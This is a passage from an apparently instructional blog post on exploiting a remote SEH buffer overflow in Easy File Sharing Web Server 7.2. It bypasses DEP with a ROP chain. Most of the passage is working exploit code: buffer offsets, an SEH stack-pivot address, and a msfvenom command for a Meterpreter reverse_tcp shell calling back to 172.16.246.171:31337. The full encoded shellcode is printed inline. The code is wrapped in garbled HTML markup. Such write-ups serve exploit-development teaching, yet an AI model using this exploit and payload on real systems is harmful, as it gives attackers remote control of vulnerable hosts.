</span><span class='line'><span class="p">]</span>
</span><span class='line'><span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&amp;lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Those <code>INC EDX</code> are really ugly and annoying, but, quickly looking around for a better solution available, I actually didn&rsquo;t find anything nicer. Luckily we have a massive buffer in our disposal, so we can be a bit sloppy&hellip;</p>

<p>We are almost there! To quickly test wether we are actually disabling DEP or not, let&rsquo;s modify our buffer a bit:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                    <span class="c"># couple INT3 instructions, which will act as a breakpoint (only if DEP is disabled)</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                                <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0x1002280a</span><span class="p">)</span>         <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0xffffffff</span><span class="p">)</span>         <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s put it all together and launch our exploit. If we were successful in disabling DEP, the program should automatically break on the INT3 instructions we added right after the ROP chain.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png" alt="success_rop PNG" /></a></p>

<p><strong>VICTORY! :)</strong></p>

<h2>Shellcode</h2>

<p>We have successfully bypassed DEP and made stack executable again! Now we can simply put a shellcode of our choice and get that shell!</p>

<p>Doing a bit of maths, we can easily calculate that the maximum size of the shellcode can be 1260 bytes, which is <em>A LOT</em> for a shellcode - and more than enough to fit meterpreter! Let&rsquo;s go ahead and generate a payload we&rsquo;ll use:</p>

<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.246.171 LPORT=31337 -f python -b '\x00\x3b' | sed 's/buf/shellcode/g'
</code></pre>

<p>And paste it in right after the ROP chain. Note that the last instruction in our ROP chain is <code>PUSHAD; RETN</code>, so the next instruction to be executed will be simply the next instruction after this one - that&rsquo;s why we&rsquo;re putting our shellcode immediatelly after.</p>

<p>Also, there&rsquo;s a small &lsquo;trick&rsquo; to keep in mind. Because of the way meterpreter decoders work, during the decoding process meterpreter needs to find its own address in memory. It is achieved by using <code>FSTENV</code> instruction, which stores floating point environment on the stack. Because ESP points somewhere in our shellcode, <code>FSTENV</code> writes some additional data onto the stack, what corrupts our shellcode!</p>

<p>One simple way around it is to simply move ESP all the way &ldquo;up&rdquo; (towards lower memory addresses), far away from our shellcode so it doesn&rsquo;t get corrupted. How far to move? Generally size of the shellcode would do. I chose 1500, just to be on the safe side.</p>

<p>Generate relevant opcode (remember about the bad chars that we should avoid!):</p>

<pre><code>root@kali2:~# /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file &lt;file&gt;" to parse a GAS assembler source file

metasm &gt; add esp,-1500
"\x81\xc4\x24\xfa\xff\xff"
</code></pre>

<p>And add it as a first instruction in the shellcode. The buffer should look something like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">move</span> <span class="n">ESP</span> <span class="n">out</span> <span class="n">of</span> <span class="n">the</span> <span class="n">way</span> <span class="n">so</span> <span class="n">the</span> <span class="n">shellcode</span> <span class="n">doesn</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">corrupt</span> <span class="n">itself</span> <span class="n">during</span> <span class="n">execution</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">metasm</span> <span class="o">&gt;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span><span class="o">-</span><span class="mi">1500</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xc4</span>\<span class="n">x24</span>\<span class="n">xfa</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">246.171</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">31337</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">360</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb8</span>\<span class="n">x78</span>\<span class="n">xdc</span>\<span class="n">xf7</span>\<span class="n">x67</span>\<span class="n">xda</span>\<span class="n">xc6</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5d</span>\<span class="n">x29</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">xb1</span>\<span class="n">x54</span>\<span class="n">x31</span>\<span class="n">x45</span>\<span class="n">x13</span>\<span class="n">x83</span>\<span class="n">xc5</span>\<span class="n">x04</span>\<span class="n">x03</span>\<span class="n">x45</span>\<span class="n">x77</span>\<span class="n">x3e</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x02</span>\<span class="n">x9b</span>\<span class="n">x6f</span>\<span class="n">x3c</span>\<span class="n">xed</span>\<span class="n">x64</span>\<span class="n">x6f</span>\<span class="n">x21</span>\<span class="n">x67</span>\<span class="n">x81</span>\<span class="n">x5e</span>\<span class="n">x61</span>\<span class="n">x13</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc1</span>\<span class="n">xf0</span>\<span class="n">x51</span>\<span class="n">x57</span>\<span class="n">x87</span>\<span class="n">xfc</span>\<span class="n">x1a</span>\<span class="n">x35</span>\<span class="n">x3c</span>\<span class="n">x77</span>\<span class="n">x6e</span>\<span class="n">x92</span>\<span class="n">x33</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x30</span>\<span class="n">xc5</span>\<span class="n">xc4</span>\<span class="n">x7a</span>\<span class="n">xc1</span>\<span class="n">x76</span>\<span class="n">x34</span>\<span class="n">x1c</span>\<span class="n">x41</span>\<span class="n">x85</span>\<span class="n">x69</span>\<span class="n">xfe</span>\<span class="n">x78</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x46</span>\<span class="n">x7c</span>\<span class="n">xff</span>\<span class="n">xbd</span>\<span class="n">xbb</span>\<span class="n">x8d</span>\<span class="n">xad</span>\<span class="n">x16</span>\<span class="n">xb7</span>\<span class="n">x20</span>\<span class="n">x42</span>\<span class="n">x13</span>\<span class="n">x8d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xf8</span>\<span class="n">xe9</span>\<span class="n">x6f</span>\<span class="n">x03</span>\<span class="n">x79</span>\<span class="n">x0d</span>\<span class="n">x27</span>\<span class="n">x22</span>\<span class="n">xa8</span>\<span class="n">x80</span>\<span class="n">x3c</span>\<span class="n">x7d</span>\<span class="n">x6a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x22</span>\<span class="n">x91</span>\<span class="n">xf5</span>\<span class="n">x23</span>\<span class="n">x3c</span>\<span class="n">xf6</span>\<span class="n">x30</span>\<span class="n">xfd</span>\<span class="n">xb7</span>\<span class="n">xcc</span>\<span class="n">xcf</span>\<span class="n">xfc</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1d</span>\<span class="n">x2f</span>\<span class="n">x52</span>\<span class="n">x5c</span>\<span class="n">x92</span>\<span class="n">xc2</span>\<span class="n">xaa</span>\<span class="n">x98</span>\<span class="n">x14</span>\<span class="n">x3d</span>\<span class="n">xd9</span>\<span class="n">xd0</span>\<span class="n">x67</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc0</span>\<span class="n">xda</span>\<span class="n">x26</span>\<span class="n">x1a</span>\<span class="n">x1e</span>\<span class="n">x6e</span>\<span class="n">xbd</span>\<span class="n">xbc</span>\<span class="n">xd5</span>\<span class="n">xc8</span>\<span class="n">x19</span>\<span class="n">x3d</span>\<span class="n">x39</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x8e</span>\<span class="n">xea</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">xc4</span>\<span class="n">xb5</span>\<span class="n">x55</span>\<span class="n">x09</span>\<span class="n">x08</span>\<span class="n">xce</span>\<span class="n">x61</span>\<span class="n">x82</span>\<span class="n">xaf</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x01</span>\<span class="n">xe0</span>\<span class="n">xd0</span>\<span class="n">x8b</span>\<span class="n">x85</span>\<span class="n">xa9</span>\<span class="n">x83</span>\<span class="n">xb2</span>\<span class="n">x9c</span>\<span class="n">x17</span>\<span class="n">x65</span>\<span class="n">xca</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xf8</span>\<span class="n">xda</span>\<span class="n">x6e</span>\<span class="n">x8b</span>\<span class="n">x14</span>\<span class="n">x0e</span>\<span class="n">x03</span>\<span class="n">xd6</span>\<span class="n">x70</span>\<span class="n">xe3</span>\<span class="n">x2e</span>\<span class="n">xe9</span>\<span class="n">x80</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x38</span>\<span class="n">x9a</span>\<span class="n">xb2</span>\<span class="n">x34</span>\<span class="n">x92</span>\<span class="n">x34</span>\<span class="n">xfe</span>\<span class="n">xbd</span>\<span class="n">x3c</span>\<span class="n">xc2</span>\<span class="n">x01</span>\<span class="n">x94</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xf9</span>\<span class="n">x5c</span>\<span class="n">xfc</span>\<span class="n">x17</span>\<span class="n">xfa</span>\<span class="n">x75</span>\<span class="n">x3a</span>\<span class="n">x43</span>\<span class="n">xaa</span>\<span class="n">xed</span>\<span class="n">xeb</span>\<span class="n">xec</span>\<span class="n">x21</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xee</span>\<span class="n">x14</span>\<span class="n">x39</span>\<span class="n">xdf</span>\<span class="n">xeb</span>\<span class="n">x82</span>\<span class="n">x6e</span>\<span class="n">x30</span>\<span class="n">x02</span>\<span class="n">xf9</span>\<span class="n">x07</span>\<span class="n">x33</span>\<span class="n">xea</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x87</span>\<span class="n">xbe</span>\<span class="n">xba</span>\<span class="n">x0c</span>\<span class="n">x27</span>\<span class="n">x11</span>\<span class="n">xed</span>\<span class="n">x80</span>\<span class="n">x87</span>\<span class="n">xc1</span>\<span class="n">x4d</span>\<span class="n">x71</span>\<span class="n">x6f</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x08</span>\<span class="n">x42</span>\<span class="n">xae</span>\<span class="n">x8f</span>\<span class="n">x33</span>\<span class="n">x88</span>\<span class="n">xc7</span>\<span class="n">x25</span>\<span class="n">xdc</span>\<span class="n">x65</span>\<span class="n">xbf</span>\<span class="n">xd1</span>\<span class="n">x45</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2c</span>\<span class="n">x4b</span>\<span class="n">x40</span>\<span class="n">x89</span>\<span class="n">xfa</span>\<span class="n">x31</span>\<span class="n">x42</span>\<span class="n">x01</span>\<span class="n">x0f</span>\<span class="n">xc5</span>\<span class="n">x0c</span>\<span class="n">xe2</span>\<span class="n">x7a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xd5</span>\<span class="n">x78</span>\<span class="n">x93</span>\<span class="n">x84</span>\<span class="n">x25</span>\<span class="n">x78</span>\<span class="n">x3e</span>\<span class="n">x85</span>\<span class="n">x4f</span>\<span class="n">x7c</span>\<span class="n">xe8</span>\<span class="n">xd2</span>\<span class="n">xe7</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x7e</span>\<span class="n">xcd</span>\<span class="n">x15</span>\<span class="n">xa8</span>\<span class="n">x81</span>\<span class="n">x38</span>\<span class="n">x26</span>\<span class="n">xaf</span>\<span class="n">x7d</span>\<span class="n">xbd</span>\<span class="n">x1f</span>\<span class="n">xdb</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2b</span>\<span class="n">x20</span>\<span class="n">xb3</span>\<span class="n">xb3</span>\<span class="n">xbb</span>\<span class="n">xa0</span>\<span class="n">x43</span>\<span class="n">xe5</span>\<span class="n">xd1</span>\<span class="n">xa0</span>\<span class="n">x2b</span>\<span class="n">x51</span>\<span class="n">x82</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xf2</span>\<span class="n">x4e</span>\<span class="n">x9e</span>\<span class="n">x1f</span>\<span class="n">x67</span>\<span class="n">xc3</span>\<span class="n">x0a</span>\<span class="n">xa0</span>\<span class="n">xde</span>\<span class="n">xb7</span>\<span class="n">x9d</span>\<span class="n">xc8</span>\<span class="n">xdc</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xee</span>\<span class="n">xe9</span>\<span class="n">x56</span>\<span class="n">x1e</span>\<span class="n">xc5</span>\<span class="n">x6a</span>\<span class="n">x90</span>\<span class="n">xe0</span>\<span class="n">x9b</span>\<span class="n">x4e</span>\<span class="n">x39</span>\<span class="n">x89</span>\<span class="n">x63</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xce</span>\<span class="n">xb9</span>\<span class="n">x49</span>\<span class="n">x0e</span>\<span class="n">xce</span>\<span class="n">xe9</span>\<span class="n">x21</span>\<span class="n">xc5</span>\<span class="n">xe1</span>\<span class="n">x06</span>\<span class="n">x82</span>\<span class="n">x26</span>\<span class="n">x28</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x4f</span>\<span class="n">x8a</span>\<span class="n">xad</span>\<span class="n">xbc</span>\<span class="n">x3d</span>\<span class="n">x2b</span>\<span class="n">xb1</span>\<span class="n">x95</span>\<span class="n">xe0</span>\<span class="n">xf5</span>\<span class="n">xb2</span>\<span class="n">x19</span>\<span class="n">x39</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe3</span>\<span class="n">x3c</span>\<span class="n">xde</span>\<span class="n">xbe</span>\<span class="n">x0c</span>\<span class="n">xbf</span>\<span class="n">xe3</span>\<span class="n">x68</span>\<span class="n">x35</span>\<span class="n">xb5</span>\<span class="n">x24</span>\<span class="n">xa9</span>\<span class="n">x02</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc6</span>\<span class="n">x1f</span>\<span class="n">x8c</span>\<span class="n">x23</span>\<span class="n">x4d</span>\<span class="n">x5f</span>\<span class="n">x82</span>\<span class="n">x34</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                                <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0x1002280a</span><span class="p">)</span>         <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
